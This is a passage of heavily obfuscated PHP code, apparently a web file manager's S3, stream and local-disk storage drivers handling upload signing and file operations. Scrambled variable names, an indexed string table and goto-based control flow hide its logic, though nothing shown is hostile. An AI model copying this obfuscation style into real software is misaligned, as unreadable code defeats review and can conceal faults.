size($C¹öÒŒ·ø) { $A¸õô¤ÍÉ¼ = $this->objectMeta($C¹öÒŒ·ø); return $A¸õô¤ÍÉ¼ ? $A¸õô¤ÍÉ¼[$_SERVER[‘®…¢À][78]] : 0; } public function info($c¿†œ¶œ›õ) { if ($this->isFolder($c¿†œ¶œ›õ)) { return $this->folderInfo($c¿†œ¶œ›õ); } else { if ($this->isFile($c¿†œ¶œ›õ)) { return $this->fileInfo($c¿†œ¶œ›õ); } } return !1; } public function exist($A†‹„áÈ°¼) { return $this->isFile($A†‹„áÈ°¼) || $this->isFolder($A†‹„áÈ°¼); } public function isFile($cŠ¶Şµë’”) { return !$this->isFolder($cŠ¶Şµë’”) && $this->objectMeta($cŠ¶Şµë’”); } public function isFolder($D‰¦é›„‹) { return $this->cacheMethod($_SERVER[‘®…¢À][220], $D‰¦é›„‹); } protected function objectMeta($eä…åÕäÉ) { return $this->cacheMethod($_SERVER[‘®…¢À][221], $eä…åÕäÉ); } protected function _objectMeta($dÏØí…ÚÃ) { $c×¥—ŸçÊˆ =& $_SERVER[‘®…¢À]; list($BÒ°‡Òã¶, $f„Š†Æ•ºí) = $this->bucketManager->stat($this->bucket, $dÏØí…ÚÃ); if ($BÒ°‡Òã¶) { $BÒ°‡Òã¶[$c×¥—ŸçÊˆ[78]] = intval($BÒ°‡Òã¶[$c×¥—ŸçÊˆ[1167]]); } return $BÒ°‡Òã¶; } protected function _isFolder($a¹•â°ÜØø) { $D¿¡Ü†Û‹— =& $_SERVER[‘®…¢À]; list($dÈÌÈøï†, $AïŠŸ ë÷Ê) = $this->bucketManager->listFiles($this->bucket, trim($a¹•â°ÜØø, $D¿¡Ü†Û‹—[8]) . $D¿¡Ü†Û‹—[8], $D¿¡Ü†Û‹—[33], 1, $D¿¡Ü†Û‹—[8]); return !empty($dÈÌÈøï†[$D¿¡Ü†Û‹—[1166]]) || !empty($dÈÌÈøï†[$D¿¡Ü†Û‹—[1169]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($d¯©›ìí‹Œ) { parent::__construct($d¯©›ìí‹Œ); } public function uploadFormData($cÏñº—Ÿ, $eçÂ„ˆßØ° = 3600) { goto bö¹ŞÊî‡; dª§Ÿğ¶ğÇ: $e…¥ƒÅ¡ = $B½Ô¸¥Ú°˜[1086]; $dßĞÀŠŠÕµ = $eçÂ„ˆßØ° . $B½Ô¸¥Ú°˜[33]; $CƒÓëËâñÆ = $B½Ô¸¥Ú°˜[1050]; goto E§µïÍŠø›; BĞñÜ‘‚ªŒ: $dÂ¿µ·ÜÍë = $B½Ô¸¥Ú°˜[59]; $E¨ØŸ­¥è = gmdate($B½Ô¸¥Ú°˜[1085]); $DÜ•Ô¯œÉ™ = gmdate($B½Ô¸¥Ú°˜[663]); goto dª§Ÿğ¶ğÇ; bö¹ŞÊî‡: $B½Ô¸¥Ú°˜ =& $_SERVER[‘®…¢À]; $C˜¥†Öë = $B½Ô¸¥Ú°˜[182]; $ağ‚ë®İÜñ = $B½Ô¸¥Ú°˜[1084]; goto BĞñÜ‘‚ªŒ; e¸Êæ÷­›¶: $bÕœºÔŠ˜ = array($B½Ô¸¥Ú°˜[196] => $B½Ô¸¥Ú°˜[33], $B½Ô¸¥Ú°˜[1096] => $B½Ô¸¥Ú°˜[33], $B½Ô¸¥Ú°˜[1054] => $C˜¥†Öë, $B½Ô¸¥Ú°˜[1058] => $CƒÓëËâñÆ, $B½Ô¸¥Ú°˜[1062] => $d¤Ÿã¾¢„ß, $B½Ô¸¥Ú°˜[1097] => $E†¨®¹ëÚŞ, $B½Ô¸¥Ú°˜[1098] => $ağ‚ë®İÜñ, $B½Ô¸¥Ú°˜[1099] => $E¨ØŸ­¥è, $B½Ô¸¥Ú°˜[1100] => $dßĞÀŠŠÕµ, $B½Ô¸¥Ú°˜[1101] => $BäõäËö¹ñ, $B½Ô¸¥Ú°˜[166] => $this->getHost()); return $bÕœºÔŠ˜; goto Fé…ÙÆ «©; FŒÛÙˆğÍ: $FÜåÌÚŠÔğ = hash_hmac($B½Ô¸¥Ú°˜[1094], $dÂ¿µ·ÜÍë, $F«¥äù£‰, !0); $DãË‹ª¦ = hash_hmac($B½Ô¸¥Ú°˜[1094], $e…¥ƒÅ¡, $FÜåÌÚŠÔğ, !0); $BäõäËö¹ñ = hash_hmac($B½Ô¸¥Ú°˜[1094], $d¤Ÿã¾¢„ß, $DãË‹ª¦); goto e¸Êæ÷­›¶; E§µïÍŠø›: $A†ŠÑ¡Ãå = array($this->accessKey, $DÜ•Ô¯œÉ™, $this->region, $dÂ¿µ·ÜÍë, $e…¥ƒÅ¡); $E†¨®¹ëÚŞ = implode($B½Ô¸¥Ú°˜[8], $A†ŠÑ¡Ãå); $cÑáÚ¬Ö£È = array($B½Ô¸¥Ú°˜[1052] => gmdate($B½Ô¸¥Ú°˜[1051], strtotime($B½Ô¸¥Ú°˜[1087])), $B½Ô¸¥Ú°˜[1053] => array(array($B½Ô¸¥Ú°˜[1055] => $this->bucket), array($B½Ô¸¥Ú°˜[1054] => $C˜¥†Öë), array($B½Ô¸¥Ú°˜[1056], $B½Ô¸¥Ú°˜[1057], $B½Ô¸¥Ú°˜[33]), array($B½Ô¸¥Ú°˜[1056], $B½Ô¸¥Ú°˜[1088], $B½Ô¸¥Ú°˜[33]), array($B½Ô¸¥Ú°˜[1056], $B½Ô¸¥Ú°˜[1089], $B½Ô¸¥Ú°˜[33]), array($B½Ô¸¥Ú°˜[1058] => $CƒÓëËâñÆ), array($B½Ô¸¥Ú°˜[1090] => $E†¨®¹ëÚŞ), array($B½Ô¸¥Ú°˜[1091] => $ağ‚ë®İÜñ), array($B½Ô¸¥Ú°˜[1092] => $E¨ØŸ­¥è), array($B½Ô¸¥Ú°˜[1093] => $dßĞÀŠŠÕµ))); goto e‡Ëï°Ó·; e‡Ëï°Ó·: $d¤Ÿã¾¢„ß = base64_encode(json_encode($cÑáÚ¬Ö£È)); $AõóÁ„‘É¾ = hash_hmac($B½Ô¸¥Ú°˜[1094], $DÜ•Ô¯œÉ™, $B½Ô¸¥Ú°˜[1095] . $this->secret, !0); $F«¥äù£‰ = hash_hmac($B½Ô¸¥Ú°˜[1094], $this->region, $AõóÁ„‘É¾, !0); goto FŒÛÙˆğÍ; Fé…ÙÆ «©: } public function multiUploadFormData($e÷Ö÷±¿«, $dˆ­ƒ = 3600) { $B©çô¯Òê =& $_SERVER[‘®…¢À]; $BºÛ„ˆõ” = gmdate($B©çô¯Òê[1181]); $c†ãÉ ˆ‡ç = array(); $Fèåè‹ìÜ = $this->client->getUploadId($this->bucket, $e÷Ö÷±¿«, $c†ãÉ ˆ‡ç); if (!$Fèåè‹ìÜ) { return !1; } return array($B©çô¯Òê[206] => $Fèåè‹ìÜ, $B©çô¯Òê[166] => $this->getHost() . $B©çô¯Òê[8] . $this->pathEncode($e÷Ö÷±¿«), $B©çô¯Òê[207] => $BºÛ„ˆõ”, $B©çô¯Òê[90] => $e÷Ö÷±¿«); } public function multiUploadAuthData($FãË¾í“ó”, $dĞßš‰±À« = array()) { goto a’“É„†Íâ; a’“É„†Íâ: $BÏÏëïË¿ =& $_SERVER[‘®…¢À]; $cìÑŒéö¨î = isset($dĞßš‰±À«[$BÏÏëïË¿[157]]) ? $dĞßš‰±À«[$BÏÏëïË¿[157]] : $BÏÏëïË¿[33]; $b÷š½½ÇÎ‰ = $dĞßš‰±À«[$BÏÏëïË¿[90]]; goto CÍ»­À¼ëŠ; CÍ»­À¼ëŠ: unset($dĞßš‰±À«[$BÏÏëïË¿[90]]); if (isset($dĞßš‰±À«[$BÏÏëïË¿[208]])) { return $this->listUploadParts($b÷š½½ÇÎ‰, $dĞßš‰±À«); } $eíåîà»»ƒ = array(); goto dÌÕŞƒŞ£; A¼Ë¹õç—¹: if (strpos($cìÑŒéö¨î, $BÏÏëïË¿[210]) === 0) { if (isset($eíåîà»»ƒ[$BÏÏëïË¿[1183]])) { $e¶†‹Òøï = $eíåîà»»ƒ[$BÏÏëïË¿[1183]]; } else { if (isset($A‰±ŒäõïÆ[$BÏÏëïË¿[1183]])) { $e¶†‹Òøï = $A‰±ŒäõïÆ[$BÏÏëïË¿[1183]]; } else { $e¶†‹Òøï = hash($BÏÏëïË¿[1094], $BÏÏëïË¿[33]); } } return array($BÏÏëïË¿[217] => $A‰±ŒäõïÆ[$BÏÏëïË¿[217]], $BÏÏëïË¿[1183] => $e¶†‹Òøï, $BÏÏëïË¿[207] => $A‰±ŒäõïÆ[$BÏÏëïË¿[1186]]); } return $A‰±ŒäõïÆ[$BÏÏëïË¿[217]]; goto dÔ¢ŒØÀİŸ; BëÍ…Ô†Ë‘: $EšõÁ®ŞÊ = $BÏÏëïË¿[211]; $eÉÃâÉî² = $BÏÏëïË¿[8] . $this->pathEncode($b÷š½½ÇÎ‰) . $cìÑŒéö¨î; $A‰±ŒäõïÆ = $this->client->__getSignatureV4($eíåîà»»ƒ, $EòÉŒìÙ—, $EšõÁ®ŞÊ, $eÉÃâÉî²); goto A¼Ë¹õç—¹; dÌÕŞƒŞ£: if (isset($dĞßš‰±À«[$BÏÏëïË¿[1182]])) { $eíåîà»»ƒ[$BÏÏëïË¿[1183]] = $dĞßš‰±À«[$BÏÏëïË¿[1182]]; } $B‚È†Ù = explode($BÏÏëïË¿[168], $this->getHost()); $EòÉŒìÙ— = array($BÏÏëïË¿[1184] => $B‚È†Ù[1], $BÏÏëïË¿[1185] => $BÏÏëïË¿[33], $BÏÏëïË¿[196] => $BÏÏëïË¿[117], $BÏÏëïË¿[1096] => $dĞßš‰±À«[$BÏÏëïË¿[78]]); goto BëÍ…Ô†Ë‘; dÔ¢ŒØÀİŸ: } public function listUploadParts($F™ÉÆŠ“¶³, $F†„ãŒ×¤ = array()) { goto E¡ö§ƒñÕì; bŒ™·âÌ”«: if (!$cÓ¿Şáœ‰¢) { return !1; } $cê«íÏ¹õŸ = $C°‚—Äƒª[1187]; foreach ($cÓ¿Şáœ‰¢ as $aœ¥ˆ°åó£) { $cê«íÏ¹õŸ .= $C°‚—Äƒª[1188] . "\x3c\120\x61\x72\164\x4e\x75\x6d\142\x65\x72\x3e{$aœ¥ˆ°åó£[$C°‚—Äƒª[1139]]}\x3c\x2f\x50\141\x72\164\x4e\x75\x6d\142\145\162\76\xa" . "\x3c\x45\124\x61\147\76{$aœ¥ˆ°åó£[$C°‚—Äƒª[1140]]}\74\x2f\105\124\x61\147\76\xa" . $C°‚—Äƒª[1189]; } goto bø›ÙÒ˜Ùñ; eà—Òêğ­´: $Aöİ»ñœ– = array($C°‚—Äƒª[1184] => $Bîæ™Ã»®§[1], $C°‚—Äƒª[196] => $C°‚—Äƒª[117], $C°‚—Äƒª[1096] => strlen($cê«íÏ¹õŸ)); $eÙØ«—Ä– = $C°‚—Äƒª[209]; $Cç×¡å‘ªç = $C°‚—Äƒª[8] . $this->pathEncode($F™ÉÆŠ“¶³) . $F†„ãŒ×¤[$C°‚—Äƒª[157]]; goto fî¢Áô–Üœ; bø›ÙÒ˜Ùñ: $cê«íÏ¹õŸ .= $C°‚—Äƒª[1190]; $Cê«£æò¾ = array(); $Bîæ™Ã»®§ = explode($C°‚—Äƒª[168], $this->getHost()); goto eà—Òêğ­´; fî¢Áô–Üœ: $b»Ôªà‰¯ = $this->client->__getSignatureV4($Cê«£æò¾, $Aöİ»ñœ–, $eÙØ«—Ä–, $Cç×¡å‘ªç, $cê«íÏ¹õŸ); return array($C°‚—Äƒª[217] => $b»Ôªà‰¯[$C°‚—Äƒª[217]], $C°‚—Äƒª[207] => $b»Ôªà‰¯[$C°‚—Äƒª[1186]], $C°‚—Äƒª[219] => $cÓ¿Şáœ‰¢, $C°‚—Äƒª[1183] => $b»Ôªà‰¯[$C°‚—Äƒª[1183]]); goto e„èŸ§•; E¡ö§ƒñÕì: $C°‚—Äƒª =& $_SERVER[‘®…¢À]; $f–´Ğ–¿öÌ = str_replace($C°‚—Äƒª[218], $C°‚—Äƒª[33], $F†„ãŒ×¤[$C°‚—Äƒª[157]]); $cÓ¿Şáœ‰¢ = $this->client->listParts($this->bucket, $F™ÉÆŠ“¶³, $f–´Ğ–¿öÌ); goto bŒ™·âÌ”«; e„èŸ§•: } public function link($cÅ´˜±«ÊÀ, $aö¾î•×ï = array()) { return parent::link($cÅ´˜±«ÊÀ, $aö¾î•×ï); } public function fileOut($AçË°Ôó–†, $DÊ…÷Ä = false, $Aë˜„Š”áÛ = false, $d¶Åİß…À‹ = '') { if (strstr($this->endpoint, $_SERVER[‘®…¢À][1191])) { return parent::fileOutServer($AçË°Ôó–†, $DÊ…÷Ä, $Aë˜„Š”áÛ, $d¶Åİß…À‹); } parent::fileOut($AçË°Ôó–†, $DÊ…÷Ä, $Aë˜„Š”áÛ, $d¶Åİß…À‹); } public function fileOutImage($DÂÙ¤’Ö‰, $E—­„‹Á‡¨ = 250) { if (strstr($this->endpoint, $_SERVER[‘®…¢À][1191])) { return parent::fileOutImageServer($DÂÙ¤’Ö‰, $E—­„‹Á‡¨); } parent::fileOutImage($DÂÙ¤’Ö‰, $E—­„‹Á‡¨); } public function fileOutLink($eÓ—¹›šµ±) { $DÊ„ª¯Îğ´ =& $_SERVER[‘®…¢À]; if (substr($eÓ—¹›šµ±, 0, 7) == $DÊ„ª¯Îğ´[1065]) { $eÓ—¹›šµ± = $DÊ„ª¯Îğ´[1066] . substr($eÓ—¹›šµ±, 7); } header($DÊ„ª¯Îğ´[153] . $eÓ—¹›šµ±); die; } public function getHost() { $E·ÒÀ’”×¥ =& $_SERVER[‘®…¢À]; $f‘ÔØŠÏæ¦ = str_rtrim(parent::getHost(), $E·ÒÀ’”×¥[8] . $this->bucket); $f‘ÔØŠÏæ¦ = explode($E·ÒÀ’”×¥[168], $f‘ÔØŠÏæ¦); return $f‘ÔØŠÏæ¦[0] . $E·ÒÀ’”×¥[168] . $this->bucket . $E·ÒÀ’”×¥[94] . $f‘ÔØŠÏæ¦[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($CËÎ‹‘®¸, $b‡’‡»ôŠ = 0) { parent::__construct(); $this->source = $CËÎ‹‘®¸; $this->sourceSize = $b‡’‡»ôŠ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($aŒÏ’·”¶ = false) { return $this->sourceSize; } public function getContent($CÖÕ¿İ¤ğĞ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $bÊÎò£øˆß = ftell($this->source); $bœ¶İàêì = @fread($this->source, $this->sourceSize); fseek($this->source, $bÊÎò£øˆß); return $bœ¶İàêì; } } public function fileSubstr($B‡ìùêó×£ = false, $CºŸˆÒõ‹ = 0, $e¨Äğò•Ò« = 0) { if (!$e¨Äğò•Ò«) { $e¨Äğò•Ò« = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $CºŸˆÒõ‹, $e¨Äğò•Ò«); } if ($this->sourceType == self::TYPE_FILE) { $AÌìóôšÊ = ftell($this->source); fseek($this->source, $AÌìóôšÊ + $CºŸˆÒõ‹); $a‹Ü‹¨…ƒ = @fread($this->source, $e¨Äğò•Ò«); fseek($this->source, $AÌìóôšÊ); return $a‹Ü‹¨…ƒ; } } public function hashMd5($b¢²²Çñ˜Ã = false) { return md5($this->getContent()); } public static function hash($b½Ğ‚œƒØ‚, $Aàæ÷—ÚÊÎ = 0) { $Aßò¼Í¯´Ó = new PathDriverStream($b½Ğ‚œƒØ‚, $Aàæ÷—ÚÊÎ); return $Aßò¼Í¯´Ó->hashSimple($b½Ğ‚œƒØ‚); } public static function md5($A„¾ø¯ºÆ¿, $fôğå ¡÷¸ = 0) { $EŠŸ±•¤š = new PathDriverStream($A„¾ø¯ºÆ¿, $fôğå ¡÷¸); return $EŠŸ±•¤š->hashMd5($A„¾ø¯ºÆ¿); } } goto B“Ï¡À¥ì; D“¡ßöØ±²: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cÃ£²ÈÔñ) { if (substr($cÃ£²ÈÔñ, 0, 2) == $_SERVER[‘®…¢À][1105]) { $cÃ£²ÈÔñ = BASIC_PATH . substr($cÃ£²ÈÔñ, 2); } return $cÃ£²ÈÔñ; } public function iconvApp($aùñóáœë) { $e°òöºõùÃ =& $_SERVER[‘®…¢À]; global $config; return $this->iconvTo($aùñóáœë, $config[$e°òöºõùÃ[1103]], $config[$e°òöºõùÃ[1102]]); } public function iconvSystem($cŒÔ´µÌ‡×) { $CÊ‚†ŞØ =& $_SERVER[‘®…¢À]; global $config; return $this->iconvTo($cŒÔ´µÌ‡×, $config[$CÊ‚†ŞØ[1102]], $config[$CÊ‚†ŞØ[1103]]); } public function getPathOuter($c¿÷ˆ³‡ã¹) { goto F¸‹ª¦¬ºº; fØğË›“ÌÃ: return $this->pathDriver . $CÍåâ¾‡ä[8] . ltrim($c¿÷ˆ³‡ã¹, $CÍåâ¾‡ä[8]); goto bÍåÚ«š‰¾; d¶‡Ô‰„Ì„: $c¿÷ˆ³‡ã¹ = KodIO::clear($c¿÷ˆ³‡ã¹); $c¿÷ˆ³‡ã¹ = substr($c¿÷ˆ³‡ã¹, strlen($a±‚¿ß†âŞ)); if (empty($this->pathDriver)) { return $c¿÷ˆ³‡ã¹; } goto fØğË›“ÌÃ; fË·š†äë‘: if (substr($a±‚¿ß†âŞ, 0, 2) == $CÍåâ¾‡ä[1105]) { $a±‚¿ß†âŞ = BASIC_PATH . substr($a±‚¿ß†âŞ, 2); } if (substr($c¿÷ˆ³‡ã¹, 0, 2) == $CÍåâ¾‡ä[1105]) { $c¿÷ˆ³‡ã¹ = BASIC_PATH . substr($c¿÷ˆ³‡ã¹, 2); } $a±‚¿ß†âŞ = KodIO::clear($a±‚¿ß†âŞ); goto d¶‡Ô‰„Ì„; F¸‹ª¦¬ºº: $CÍåâ¾‡ä =& $_SERVER[‘®…¢À]; $a±‚¿ß†âŞ = $this->iconvApp($this->pathBase); $c¿÷ˆ³‡ã¹ = $this->iconvApp($c¿÷ˆ³‡ã¹); goto fË·š†äë‘; bÍåÚ«š‰¾: } public function mkfile($Eš’¢™’Ó¡, $bìÂ“ÏØ„‰ = '', $C­£‹Ü³‡ = REPEAT_RENAME) { $Eš’¢™’Ó¡ = $this->iconvSystem($Eš’¢™’Ó¡); @touch($Eš’¢™’Ó¡); if ($bìÂ“ÏØ„‰) { file_put_contents($Eš’¢™’Ó¡, $bìÂ“ÏØ„‰); } return is_file($Eš’¢™’Ó¡) ? $this->getPathOuter($Eš’¢™’Ó¡) : !1; } public function mkdir($EÖÚé¥éÕ, $Eø˜¢ñ²• = REPEAT_SKIP) { $EÖÚé¥éÕ = $this->iconvSystem($EÖÚé¥éÕ); if (is_dir($EÖÚé¥éÕ)) { return $this->getPathOuter($EÖÚé¥éÕ); } @mkdir($EÖÚé¥éÕ, 511, !0); return is_dir($EÖÚé¥éÕ) ? $this->getPathOuter($EÖÚé¥éÕ) : !1; } public function copyFile($Aæõ³ÒĞ, $e‚İ’ÍÇ) { $this->mkdir($this->pathFather($e‚İ’ÍÇ)); $Aæõ³ÒĞ = $this->iconvSystem($Aæõ³ÒĞ); $e‚İ’ÍÇ = $this->iconvSystem($e‚İ’ÍÇ); $e½ÓÜïğĞ‘ = @copy($Aæõ³ÒĞ, $e‚İ’ÍÇ); return $e½ÓÜïğĞ‘ ? $this->getPathOuter($e‚İ’ÍÇ) : !1; } public function moveFile($cŒİƒøÚºâ, $f¡µÁšÓç½) { $this->mkdir($this->pathFather($f¡µÁšÓç½)); $cŒİƒøÚºâ = $this->iconvSystem($cŒİƒøÚºâ); $f¡µÁšÓç½ = $this->iconvSystem($f¡µÁšÓç½); $bß´æÈ¼ä = intval(@rename($cŒİƒøÚºâ, $f¡µÁšÓç½)); if (!$bß´æÈ¼ä) { if ($bß´æÈ¼ä = intval(@copy($cŒİƒøÚºâ, $f¡µÁšÓç½))) { @unlink($cŒİƒøÚºâ); } } return $bß´æÈ¼ä ? $this->getPathOuter($f¡µÁšÓç½) : !1; } public function delFile($BîŒ³ø‰Ä) { $BîŒ³ø‰Ä = $this->iconvSystem($BîŒ³ø‰Ä); if (!@unlink($BîŒ³ø‰Ä)) { @chmod($BîŒ³ø‰Ä, 511); if (!@unlink($BîŒ³ø‰Ä)) { return !1; } } else { return !0; } } public function delFolder($aÂ…ÜÂÌ‡) { goto a„ˆ«±©”; CçƒÚÕÉŒ¯: return rmdir($aÂ…ÜÂÌ‡); goto dâÕä‹äã; a„ˆ«±©”: $F§§çğËµ =& $_SERVER[‘®…¢À]; $aÂ…ÜÂÌ‡ = $this->iconvSystem($aÂ…ÜÂÌ‡); if (!is_dir($aÂ…ÜÂÌ‡)) { return !0; } goto aŸ²„‡µÌ•; aŸ²„‡µÌ•: if (!($cİğ ¦¥ = opendir($aÂ…ÜÂÌ‡))) { return !1; } while (($C×Ê®ù…ù¹ = readdir($cİğ ¦¥)) !== !1) { if ($C×Ê®ù…ù¹ == $F§§çğËµ[94] || $C×Ê®ù…ù¹ == $F§§çğËµ[1115]) { continue; } $E¥«»­ğ”Õ = $aÂ…ÜÂÌ‡ . $F§§çğËµ[8] . $C×Ê®ù…ù¹; if (!is_dir($E¥«»­ğ”Õ)) { if (!unlink($E¥«»­ğ”Õ)) { chmod($E¥«»­ğ”Õ, 511); if (!unlink($E¥«»­ğ”Õ)) { return !1; } } } else { chmod($E¥«»­ğ”Õ, 511); $E¥«»­ğ”Õ = $this->iconvApp($E¥«»­ğ”Õ); if (!$this->delFolder($E¥«»­ğ”Õ)) { return !1; } } } closedir($cİğ ¦¥); goto CçƒÚÕÉŒ¯; dâÕä‹äã: } public function rename($Bß˜„ßù, $a×ğ¯Õóø¸) { goto f³óÉ¼æê; e“õëÎ¬Î‚: $cˆ¤ÂŸÆ° = @rename($Bß˜„ßù, $Aé«ç®Ó); $Aé«ç®Ó = $this->iconvApp($Aé«ç®Ó); return $cˆ¤ÂŸÆ° ? $this->getPathOuter($Aé«ç®Ó) : !1; goto a‰ëó´„åá; f³óÉ¼æê: $b™¥Î‚‘Š° =& $_SERVER[‘®…¢À]; $DµÖÛÖÔøÜ = $this->fileNameAuto($this->pathFather($Bß˜„ßù), $a×ğ¯Õóø¸); $DµÖÛÖÔøÜ = $this->iconvSystem($DµÖÛÖÔøÜ); goto eÜ¤ÁÄĞ‚Ê; eÜ¤ÁÄĞ‚Ê: $Bß˜„ßù = $this->iconvSystem($Bß˜„ßù); $a¯®Áâ•× = $this->pathFather($Bß˜„ßù); $Aé«ç®Ó = rtrim($a¯®Áâ•×, $b™¥Î‚‘Š°[8]) . $b™¥Î‚‘Š°[8] . $DµÖÛÖÔøÜ; goto e“õëÎ¬Î‚; a‰ëó´„åá: } public function size($aÈ×£Ù¾) { $aÈ×£Ù¾ = $this->iconvSystem($aÈ×£Ù¾); return (double) abs(sprintf($_SERVER[‘®…¢À][1117], @filesize($aÈ×£Ù¾))); } public function info($Dí¬±›÷Ö) { $Dí¬±›÷Ö = $this->iconvSystem($Dí¬±›÷Ö); if ($this->isFolder($Dí¬±›÷Ö)) { return $this->folderInfo($Dí¬±›÷Ö); } else { if ($this->isFile($Dí¬±›÷Ö)) { return $this->fileInfo($Dí¬±›÷Ö); } } return !1; } protected function infoChildren($aŒìÎËÏñŒ, &$càÌõè†Ş‚, $cåÖŠ£¡ÕÓ = true) { $E‚‚¾è¿ =& $_SERVER[‘®…¢À]; $aŒìÎËÏñŒ = rtrim($aŒìÎËÏñŒ, $E‚‚¾è¿[8]) . $E‚‚¾è¿[8]; if ($cåÖŠ£¡ÕÓ) { check_abort(); $aŒìÎËÏñŒ = $this->iconvSystem($aŒìÎËÏñŒ); } if (!($f±©Îœ…œã = @opendir($aŒìÎËÏñŒ))) { return; } while (($Bã™—©ßˆî = readdir($f±©Îœ…œã)) !== !1) { if ($Bã™—©ßˆî == $E‚‚¾è¿[94] || $Bã™—©ßˆî == $E‚‚¾è¿[1115]) { continue; } $e•Ï¶óøì = $aŒìÎËÏñŒ . $Bã™—©ßˆî; if (is_file($e•Ï¶óøì)) { $càÌõè†Ş‚[$E‚‚¾è¿[79]]++; $càÌõè†Ş‚[$E‚‚¾è¿[78]] += (double) abs(sprintf($E‚‚¾è¿[1117], @filesize($e•Ï¶óøì))); } else { $càÌõè†Ş‚[$E‚‚¾è¿[80]]++; $this->infoChildren($e•Ï¶óøì, $càÌõè†Ş‚, !1); } } closedir($f±©Îœ…œã); } private function folderInfo($D‘öŠßÕì, $F„Ïì˜åÍç = false) { $eá¾Ù–öÀ =& $_SERVER[‘®…¢À]; $D‘öŠßÕì = rtrim($D‘öŠßÕì, $eá¾Ù–öÀ[8]) . $eá¾Ù–öÀ[8]; $EåŞ–åœî = $this->iconvApp($this->pathThis($D‘öŠßÕì)); if ($F„Ïì˜åÍç) { return array($eá¾Ù–öÀ[28] => $EåŞ–åœî, $eá¾Ù–öÀ[76] => $this->getPathOuter($D‘öŠßÕì), $eá¾Ù–öÀ[29] => $eá¾Ù–öÀ[77]); } $EÁØ•øŞªÌ = array($eá¾Ù–öÀ[28] => $EåŞ–åœî, $eá¾Ù–öÀ[76] => $this->getPathOuter($D‘öŠßÕì), $eá¾Ù–öÀ[29] => $eá¾Ù–öÀ[77], $eá¾Ù–öÀ[184] => @filectime($D‘öŠßÕì), $eá¾Ù–öÀ[108] => @filemtime($D‘öŠßÕì), $eá¾Ù–öÀ[1118] => @fileatime($D‘öŠßÕì), $eá¾Ù–öÀ[1112] => is_readable($D‘öŠßÕì), $eá¾Ù–öÀ[1113] => is_writable($D‘öŠßÕì), $eá¾Ù–öÀ[1119] => get_mode($D‘öŠßÕì)); return $EÁØ•øŞªÌ; } private function fileInfo($aˆÇÂ‚¬š‡, $DŠ åÂÖÕâ = false) { $Dö”“éÃÛ„ =& $_SERVER[‘®…¢À]; $FŠÂ›ÏÑõÅ = $this->iconvApp($this->pathThis($aˆÇÂ‚¬š‡)); if ($DŠ åÂÖÕâ) { return array($Dö”“éÃÛ„[28] => $FŠÂ›ÏÑõÅ, $Dö”“éÃÛ„[76] => $this->getPathOuter($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[29] => $Dö”“éÃÛ„[164], $Dö”“éÃÛ„[78] => $this->size($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[157] => $this->ext($FŠÂ›ÏÑõÅ)); } $EÃÍ÷Ä±Ú = array($Dö”“éÃÛ„[28] => $FŠÂ›ÏÑõÅ, $Dö”“éÃÛ„[76] => $this->getPathOuter($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[29] => $Dö”“éÃÛ„[164], $Dö”“éÃÛ„[184] => @filectime($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[108] => @filemtime($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[1118] => @fileatime($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[78] => $this->size($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[157] => $this->ext($FŠÂ›ÏÑõÅ), $Dö”“éÃÛ„[1112] => is_readable($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[1113] => is_writable($aˆÇÂ‚¬š‡), $Dö”“éÃÛ„[1119] => get_mode($aˆÇÂ‚¬š‡)); return $EÃÍ÷Ä±Ú; } public function exist($BŸØÔî±¸ó) { $BŸØÔî±¸ó = $this->iconvSystem($BŸØÔî±¸ó); return @file_exists($BŸØÔî±¸ó); } public function isFile($b“—¾îØ¾¯) { $b“—¾îØ¾¯ = $this->iconvSystem($b“—¾îØ¾¯); return @is_file($b“—¾îØ¾¯); } public function isFolder($eöºÂ®†¼·) { $eöºÂ®†¼· = $this->iconvSystem($eöºÂ®†¼·); return @is_dir($eöºÂ®†¼·); } public function listPath($Ağ³·êò±, $AùÔàßôß± = false) { goto c¼“‰‘„•°; CŸâ·ÛÅ¨ç: closedir($a°‹®‡µˆ²); return $Dê”ŞïçŞ; goto A„ß¹ÌˆÄç; c¼“‰‘„•°: $D—œ†á°òè =& $_SERVER[‘®…¢À]; $Ağ³·êò± = $this->iconvSystem($Ağ³·êò±); $Ağ³·êò± = rtrim($Ağ³·êò±, $D—œ†á°òè[8]) . $D—œ†á°òè[8]; goto E™ì˜°‘ÒÏ; E™ì˜°‘ÒÏ: $Dê”ŞïçŞ = array($D—œ†á°òè[75] => array(), $D—œ†á°òè[74] => array()); if (!($a°‹®‡µˆ² = @opendir($Ağ³·êò±))) { return $Dê”ŞïçŞ; } while (($BĞÓùà¼Ì = readdir($a°‹®‡µˆ²)) !== !1) { if ($BĞÓùà¼Ì == $D—œ†á°òè[94] || $BĞÓùà¼Ì == $D—œ†á°òè[1115]) { continue; } $c’¼½Á‹š = $Ağ³·êò± . $BĞÓùà¼Ì; if (is_file($c’¼½Á‹š)) { $Dê”ŞïçŞ[$D—œ†á°òè[74]][] = $this->fileInfo($c’¼½Á‹š, $AùÔàßôß±); } else { $Dê”ŞïçŞ[$D—œ†á°òè[75]][] = $this->folderInfo($c’¼½Á‹š, $AùÔàßôß±); } } goto CŸâ·ÛÅ¨ç; A„ß¹ÌˆÄç: } public function listAll($EÚ¥¾ÃÃ£Ä, &$D«æ–Í¥Ò = array()) { goto fÜê Ê™Éæ; dÅ¯ã‡ßó…: if (!($FÍîëàÎÕ = @opendir($EÚ¥¾ÃÃ£Ä))) { return $D«æ–Í¥Ò; } while (($DŠØ†ìÑÅù = readdir($FÍîëàÎÕ)) !== !1) { if ($DŠØ†ìÑÅù == $dëªôôóë[94] || $DŠØ†ìÑÅù == $dëªôôóë[1115]) 